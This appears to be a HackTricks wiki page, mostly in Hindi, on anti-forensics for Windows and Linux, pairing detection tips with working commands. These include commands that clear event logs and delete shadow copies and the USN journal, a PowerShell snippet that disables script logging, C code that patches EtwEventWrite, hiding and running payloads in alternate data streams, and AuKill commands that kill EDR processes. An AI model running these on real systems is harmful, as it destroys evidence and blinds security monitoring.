# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## Timestamps

एक attacker का पता लगाए जाने से बचने के लिए **files के timestamps बदलने** में interest हो सकता है।\
MFT के अंदर attributes `$STANDARD_INFORMATION` \_\_ और \_\_ `$FILE_NAME` में timestamps मिलना संभव है।

दोनों attributes में 4 timestamps होते हैं: **Modification**, **access**, **creation**, और **MFT registry modification** (MACE या MACB)।

**Windows explorer** और अन्य tools **`$STANDARD_INFORMATION`** से information दिखाते हैं।

### TimeStomp - Anti-forensic Tool

यह tool **`$STANDARD_INFORMATION`** के अंदर timestamp information को **modify** करता है, लेकिन **`$FILE_NAME`** के अंदर की information को **modify नहीं** करता। इसलिए **suspicious** **activity** की पहचान करना संभव है।

### Usnjrnl

**USN Journal** (Update Sequence Number Journal), NTFS (Windows NT file system) का एक feature है, जो volume में होने वाले बदलावों का record रखता है। [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) tool इन बदलावों की examination की अनुमति देता है।

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal), NTFS (Windows NT file system) का एक feature है, जो volume में होने वाले बदलावों का record रखता है।...](<../../images/image (801).png>)

पिछली image **tool** द्वारा दिखाया गया **output** है, जिसमें देखा जा सकता है कि file में कुछ **changes किए गए** थे।

### $LogFile

**File system में होने वाले सभी metadata changes को log किया जाता है**। इस process को [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging) कहा जाता है। Logged metadata को `**$LogFile**` नाम की file में रखा जाता है, जो NTFS file system की root directory में स्थित होती है। इस file को parse करने और changes की पहचान करने के लिए [LogFileParser](https://github.com/jschicht/LogFileParser) जैसे tools का उपयोग किया जा सकता है।

![Usnjrnl - $LogFile: File system में होने वाले सभी metadata changes को write-ahead logging नामक process में log किया जाता है। Logged metadata को $LogFile नाम की file में रखा जाता है, जो root...](<../../images/image (137).png>)

फिर से, tool के output में यह देखा जा सकता है कि **कुछ changes किए गए** थे।

उसी tool का उपयोग करके यह पहचानना संभव है कि **timestamps किस समय modify किए गए**:

![Usnjrnl - $LogFile: उसी tool का उपयोग करके यह पहचानना संभव है कि timestamps किस समय modify किए गए](<../../images/image (1089).png>)

- CTIME: File का creation time
- ATIME: File का modification time
- MTIME: File का MFT registry modification
- RTIME: File का access time

### `$STANDARD_INFORMATION` and `$FILE_NAME` comparison

Suspicious रूप से modified files की पहचान करने का एक अन्य तरीका दोनों attributes के time की तुलना करना और **mismatches** ढूँढना है।

### Nanoseconds

**NTFS** timestamps की **precision** **100 nanoseconds** होती है। इसलिए 2010-10-10 10:10:**00.000:0000 जैसे timestamps वाली files मिलना **बहुत suspicious** है।

### SetMace - Anti-forensic Tool

यह tool दोनों attributes `$STARNDAR_INFORMATION` और `$FILE_NAME` को modify कर सकता है। हालांकि, Windows Vista से, इस information को modify करने के लिए live OS का होना आवश्यक है।

## Data Hiding

NFTS cluster और minimum information size का उपयोग करता है। इसका अर्थ है कि यदि कोई file एक cluster और आधे cluster का उपयोग करती है, तो **बचा हुआ आधा हिस्सा कभी उपयोग नहीं किया जाएगा** जब तक कि file delete न हो जाए। इसलिए, **इस slack space में data छिपाना** संभव है।

slacker जैसे tools इस "hidden" space में data छिपाने की अनुमति देते हैं। हालांकि, `$logfile` और `$usnjrnl` का analysis यह दिखा सकता है कि कुछ data add किया गया था:

![SetMace - Anti-forensic Tool - Data Hiding: slacker जैसे tools इस "hidden" space में data छिपाने की अनुमति देते हैं। हालांकि, $logfile और $usnjrnl का analysis यह दिखा सकता है कि...](<../../images/image (1060).png>)

इसके बाद, FTK Imager जैसे tools का उपयोग करके slack space को retrieve करना संभव है। ध्यान दें कि इस प्रकार का tool content को obfuscated या यहां तक कि encrypted रूप में save कर सकता है।

## UsbKill

यह एक ऐसा tool है जो **USB ports में कोई भी change detect होने पर computer को बंद कर देता है**।\
इसे discover करने का एक तरीका running processes को inspect करना और **चल रही प्रत्येक Python script की review करना** है।

## Live Linux Distributions

ये distros **RAM** memory के अंदर **execute** होते हैं। इन्हें detect करने का एकमात्र तरीका यह है कि NTFS file-system को write permissions के साथ mount किया गया हो। यदि इसे केवल read permissions के साथ mount किया गया है, तो intrusion को detect करना संभव नहीं होगा।

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

Forensics investigation को बहुत कठिन बनाने के लिए Windows की कई logging methods को disable करना संभव है।

### Disable Timestamps - UserAssist

यह एक registry key है, जो user द्वारा प्रत्येक executable को run किए जाने की dates और hours maintain करती है।

UserAssist को disable करने के लिए दो steps आवश्यक हैं:

1. दो registry keys, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` और `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, दोनों को zero पर set करें, ताकि signal मिले कि हम UserAssist को disabled करना चाहते हैं।
2. अपनी उन registry subtrees को clear करें जो `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` जैसी दिखती हैं।

### Disable Timestamps - Prefetch

यह Windows system की performance सुधारने के उद्देश्य से executed applications के बारे में information save करता है। हालांकि, यह forensics practices के लिए भी useful हो सकता है।

- `regedit` execute करें
- File path `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters` select करें
- `EnablePrefetcher` और `EnableSuperfetch` दोनों पर right-click करें
- इनमें से प्रत्येक पर Modify select करके value को 1 (या 3) से 0 में बदलें
- Restart करें

### Disable Timestamps - Last Access Time

जब भी Windows NT server पर किसी NTFS volume से folder open किया जाता है, system प्रत्येक listed folder पर एक timestamp field update करने के लिए time record करता है, जिसे last access time कहा जाता है। अत्यधिक उपयोग किए जाने वाले NTFS volume पर इसका performance पर प्रभाव पड़ सकता है।

1. Registry Editor (Regedit.exe) open करें।
2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem` पर जाएं।
3. `NtfsDisableLastAccessUpdate` खोजें। यदि यह मौजूद नहीं है, तो यह DWORD add करें और इसकी value 1 set करें, जिससे process disable हो जाएगा।
4. Registry Editor बंद करें और server reboot करें।

### Delete USB History

सभी **USB Device Entries** Windows Registry में **USBSTOR** registry key के अंतर्गत store होती हैं। इसमें ऐसी sub keys होती हैं, जो जब भी आप अपने PC या Laptop में USB Device plug करते हैं, create होती हैं। यह key यहां मिल सकती है: H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **इसे delete करने पर** USB history delete हो जाएगी।\
आप यह सुनिश्चित करने के लिए [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) tool का भी उपयोग कर सकते हैं कि वे delete हो गए हैं (और उन्हें delete करने के लिए भी)।

एक अन्य file जो USBs की information save करती है, वह `C:\Windows\INF` के अंदर मौजूद `setupapi.dev.log` file है। इसे भी delete किया जाना चाहिए।

### Disable Shadow Copies

`vssadmin list shadowstorage` से shadow copies की **list** प्राप्त करें\
`vssadmin delete shadow` run करके उन्हें **delete** करें

आप [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) में दिए गए steps का पालन करके GUI के माध्यम से भी उन्हें delete कर सकते हैं।

Shadow copies को disable करने के लिए [steps from here](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Windows start button पर click करने के बाद text search box में "services" type करके Services program open करें।
2. List में "Volume Shadow Copy" खोजें, उसे select करें और फिर right-click करके Properties access करें।
3. "Startup type" drop-down menu से Disabled चुनें और Apply तथा OK पर click करके change confirm करें।

Registry में shadow copy में copy की जाने वाली files के configuration को modify करना भी संभव है: `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Overwrite deleted files

- आप एक **Windows tool** का उपयोग कर सकते हैं: `cipher /w:C`। यह cipher को C drive के अंदर उपलब्ध unused disk space से कोई भी data remove करने का निर्देश देगा।
- आप [**Eraser**](https://eraser.heidi.ie) जैसे tools का भी उपयोग कर सकते हैं।

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> "Windows Logs" expand करें --> प्रत्येक category पर right-click करें और "Clear Log" select करें
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Services section में "Windows Event Log" service को disable करें
- `WEvtUtil.exec clear-log` या `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Windows 10/11 और Windows Server के recent versions `Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106) के अंतर्गत **समृद्ध PowerShell forensic artifacts** रखते हैं।
Attackers इन्हें on-the-fly disable या wipe कर सकते हैं:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Defenders को उन registry keys में होने वाले बदलावों और PowerShell events को बड़े पैमाने पर हटाए जाने की निगरानी करनी चाहिए।

### ETW (Event Tracing for Windows) Patch

Endpoint security products ETW पर बहुत अधिक निर्भर करते हैं। 2024 की एक लोकप्रिय evasion method है memory में
`ntdll!EtwEventWrite`/`EtwEventWriteFull` को patch करना, ताकि हर ETW call event emit किए बिना
`STATUS_SUCCESS` return करे:
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (जैसे `EtwTiSwallow`) PowerShell या C++ में इसी primitive को implement करते हैं।  
क्योंकि patch **process-local** होता है, इसलिए अन्य processes के अंदर चलने वाले EDRs इसे miss कर सकते हैं।  
Detection: memory में मौजूद `ntdll` की disk पर मौजूद कॉपी से तुलना करें, या user-mode से पहले hook करें।

### Alternate Data Streams (ADS) Revival

2023 में malware campaigns (जैसे **FIN12** loaders) में traditional scanners की नजर से दूर रहने के लिए second-stage binaries को ADS के अंदर staging करते हुए देखा गया है:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
`dir /R`, `Get-Item -Stream *`, या Sysinternals `streams64.exe` से streams enumerate करें।  
Host file को FAT/exFAT पर या SMB के माध्यम से copy करने पर hidden stream हट जाएगा और investigators इसका उपयोग payload recover करने के लिए कर सकते हैं।

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver का उपयोग अब ransomware intrusions में **anti-forensics** के लिए नियमित रूप से किया जाता है।  
Open-source tool **AuKill** एक signed लेकिन vulnerable driver (`procexp152.sys`) load करता है, ताकि **encryption & log destruction** से पहले EDR और forensic sensors को suspend या terminate किया जा सके:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
The driver is removed afterwards, leaving minimal artifacts.<sup>[[1]](#references)</sup>  
Mitigations: Microsoft vulnerable-driver blocklist (HVCI/SAC) enable करें,  
और user-writable paths से kernel-service creation पर alert करें।

---

## Linux Anti-Forensics: Self-Patching और Cloud C2 (2023–2025)

### Detection कम करने के लिए compromised services को Self-patching करना (Linux)
Adversaries किसी service का exploitation करने के तुरंत बाद उसे increasingly “self-patch” करते हैं, ताकि re-exploitation को रोका जा सके और vulnerability-based detections को suppress किया जा सके। विचार यह है कि vulnerable components को latest legitimate upstream binaries/JARs से replace कर दिया जाए, ताकि scanners host को patched report करें, जबकि persistence और C2 बने रहें।<sup>[[3]](#references)</sup>

Example: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)<sup>[[3]](#references)[[4]](#references)</sup>
- Post-exploitation के बाद attackers ने Maven Central (repo1.maven.org) से legitimate JARs fetch किए, ActiveMQ install में vulnerable JARs को delete किया और broker को restart किया।
- इससे initial RCE बंद हो गया, जबकि अन्य footholds (cron, SSH config changes, separate C2 implants) बने रहे।

Operational example (illustrative)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forensic/hunting tips
- अनिर्धारित binary/JAR replacements के लिए service directories की समीक्षा करें:
- Debian/Ubuntu: `dpkg -V activemq` चलाएं और repo mirrors के साथ file hashes/paths की तुलना करें।
- ऐसे JAR versions देखें जो disk पर मौजूद हों लेकिन package manager के स्वामित्व में न हों, या ऐसे symbolic links जिन्हें out of band update किया गया हो।
- Timeline: compromise window के साथ ctime/mtime का correlation करने के लिए `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` चलाएं।
- Shell history/process telemetry: initial exploitation के तुरंत बाद `repo1.maven.org` या अन्य artifact CDNs पर `curl`/`wget` के evidence देखें।
- Change management: केवल patched version मौजूद होने की पुष्टि न करें, बल्कि यह validate करें कि “patch” किसने और क्यों लागू किया।

### bearer tokens और anti-analysis stagers के साथ Cloud-service C2
Observed tradecraft ने कई long-haul C2 paths और anti-analysis packaging को संयोजित किया:<sup>[[3]](#references)</sup>
- sandboxing और static analysis में बाधा डालने वाले password-protected PyInstaller ELF loaders (जैसे encrypted PYZ, `/_MEI*` के अंतर्गत temporary extraction)।
- Indicators: `strings` में `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS` जैसे hits।
- Runtime artifacts: `/tmp/_MEI*` या custom `--runtime-tmpdir` paths में extraction।
- hardcoded OAuth Bearer tokens का उपयोग करने वाला Dropbox-backed C2
- Network markers: `Authorization: Bearer <token>` के साथ `api.dropboxapi.com` / `content.dropboxapi.com`।
- ऐसे server workloads से Dropbox domains पर outbound HTTPS के लिए proxy/NetFlow/Zeek/Suricata में hunt करें, जो सामान्यतः files sync नहीं करते।
- tunneling (जैसे Cloudflare Tunnel `cloudflared`) के माध्यम से parallel/backup C2, ताकि एक channel block होने पर भी control बना रहे।
- Host IOCs: `cloudflared` processes/units, `~/.cloudflared/*.json` पर config, और Cloudflare edges के लिए outbound 443।

### Access बनाए रखने के लिए Persistence और “hardening rollback” (Linux examples)
Attackers अक्सर self-patching को durable access paths के साथ जोड़ते हैं:<sup>[[3]](#references)</sup>
- Cron/Anacron: periodic execution के लिए प्रत्येक `/etc/cron.*/` directory में `0anacron` stub में edits।
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: root logins enable करना और low-privileged accounts के लिए default shells बदलना।
- Root login enablement के लिए hunt करें:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# "yes" जैसे values या अत्यधिक permissive settings को flag करें
```
- System accounts (जैसे `games`) पर suspicious interactive shells के लिए hunt करें:
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Disk पर छोड़े गए random, short-named beacon artifacts (8 alphabetical chars), जो cloud C2 से भी contact करते हैं:
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders को initial exploitation को छिपाने के लिए उपयोग किए गए anti-forensic self-remediation का पता लगाने हेतु इन artifacts का external exposure और service patching events के साथ correlation करना चाहिए।

## References

- [1] [Sophos X-Ops – AuKill: A Weaponized Vulnerable Driver for Disabling EDR (March 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite for Stealth: Detection & Hunting (June 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
